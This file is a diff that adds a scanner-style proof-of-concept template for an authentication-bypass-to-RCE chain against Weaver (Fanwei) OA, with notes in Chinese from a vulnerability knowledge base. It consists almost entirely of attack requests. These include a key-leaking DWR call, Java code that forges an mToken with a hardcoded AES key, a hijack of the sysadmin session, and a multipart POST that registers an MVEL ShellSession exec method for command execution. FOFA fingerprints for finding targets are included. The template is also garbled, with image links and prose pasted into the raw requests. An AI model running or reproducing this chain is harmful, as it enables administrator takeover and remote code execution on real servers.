@@ -1,0 +1,159 @@
+id: poc-ra5afl3f1cyp749x
+info:
+  name: 泛微OA前台登录绕过+后台组合拳RCE
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ra5afl3f1cyp749x'
+  tags: rce,unauth,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ra5afl3f1cyp749x
+    fofa: body = "/wui/common/css/w7OVFont_wev8.css" || header="testBanCookie" || body="/wui/common/css/w7OVFont.css" || body="/js/ecology8" || body="alert('高效源于协同')" || body="wui/common/css/w7OVFont_wev8.css"|
+http:
+- raw:
+  - "POST /dwr/call/plaincall/?callCount=1&c0-id=1&c0-scriptName=WorkflowSubwfSetUtil&c0-methodName=LoadTemplateProp&batchId=a&c0-param0=string:mobilemode&scriptSessionId=1&a=.swf HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nUpgrade-Insecure-Requests: 1\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1751640680640-37e42add-729e-4214-9971-4d8fa0b9dcc3.png)\n其中security.key为 5f2f28dd-db4a-45\n调用aes加密函数\nimport java.security.SecureRandom;\nimport javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.spec.SecretKeySpec;\nimport javax.xml.bind.DatatypeConverter;\n\npublicclass Main {\n    public static String encrypt(String str, String str2) {\n        try {\n            KeyGenerator keyGenerator = KeyGenerator.getInstance(\"AES\");\n            SecureRandom secureRandom = SecureRandom.getInstance(\"SHA1PRNG\");\n            secureRandom.setSeed(str2.getBytes());\n            keyGenerator.init(128, secureRandom);\n            SecretKeySpec secretKeySpec = new SecretKeySpec(keyGenerator.generateKey().getEncoded(), \"AES\");\n            Cipher cipher = Cipher.getInstance(\"AES\");\n            cipher.init(1, secretKeySpec);\n            return DatatypeConverter.printHexBinary(cipher.doFinal(str.getBytes()));\n        } catch (Exception e) {\n            e.printStackTrace();\n            return\"\";\n        }\n    }\n\n    public static void main(String[] args) {\n        System.out.println(encrypt(\"1;1;\"+System.currentTimeMillis(),\"5f2f28dd-db4a-45\"));\n    }\n}\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1751640680980-21fe5bfa-d130-4626-ba9d-97be2bddca2b.png)\n获取到密钥，即为下面需要用到的mToken\n获取sessionKey"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /mobilemode/mobile/server.jsp?invoker=com.api.mobilemode.web.mobile.service.MobileEntranceAction&action=meta&appid=1&appHomepageId=1&mTokenFrom=QRCode&mToken=BAAD7750912407C15FBC7CA2BDA4BDDDAEACE215E26BB871CE8D171028A66A70&_ec_ismobile=true&timeZoneOffset=&a=.swf HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Upgrade-Insecure-Requests: 1
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1751640681277-b74c1f75-8bfa-4ef4-b7c6-d22bbba75433.png)
+
+    获取到sysadmin 的sessionKey
+
+    登录后台
+
+    将sessionKey转换为ecology_JSessionid即可登录后台'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /weaver/ImgFileDownload/a.swf?sessionkey=b20e3665-d8a8-403d-a041-0c5883626da4&a=.swf HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Upgrade-Insecure-Requests: 1
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1751640681538-2d1ef830-fb07-48cf-8a19-b70fc0b25a9f.png)
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1751640681847-bc5169d2-2563-4713-8dbc-fcc088c45b22.png)
+
+    后台RCE
+
+    添加方法'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /interface/outter/outter_encryptclassOperation.jsp?a=1.swf HTTP/1.1
+
+    Host: {{Hostname}}
+
+    If-None-Match: "6evu6PUo/Cz"
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    If-Modified-Since: Thu, 23 Jun 2022 11:04:04 GMT
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVnIIu
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: ecology_JSessionid=aaa_db33mBm_EaOGEO8bz; __randcode__=b7e3d245-5b6b-44ba-b06b-f4b5592d68dc
+
+
+
+    ------WebKitFormBoundaryVnIIugCdViAmEyK3
+
+    Content-Disposition: form-data; name="operation"
+
+
+    add
+
+    ------WebKitFormBoundaryVnIIugCdViAmEyK3
+
+    Content-Disposition: form-data; name="encryptname"
+
+
+    ttttaaa
+
+    ------WebKitFormBoundaryVnIIugCdViAmEyK3
+
+    Content-Disposition: form-data; name="encryptclass"
+
+
+    org.mvel2.sh.ShellSession
+
+    ------WebKitFormBoundaryVnIIugCdViAmEyK3
+
+    Content-Disposition: form-data; name="encryptmethod"
+
+
+    exec
+
+    ------WebKitFormBoundaryVnIIugCdViAmEyK3
+
+    Content-Disposition: form-data; name="decryptmethod"
+
+
+    exec
+
+    ------WebKitFormBoundaryVnIIugCdViAmEyK3
+
+    Content-Disposition: form-data; name="isdialog"
+
+
+    0
+
+    ------WebKitFormBoundaryVnIIugCdViAmEyK3
+
+    Content-Disposition: form-data; name="x"; filename="x"
+
+
+    x
+
+    ------WebKitFormBoundaryVnIIugCdViAmEyK3--
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1751640682144-7949bdb4-4f4d-4063-bb4a-1a774d6c74a9.png)
+
+    查看添加的ID'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
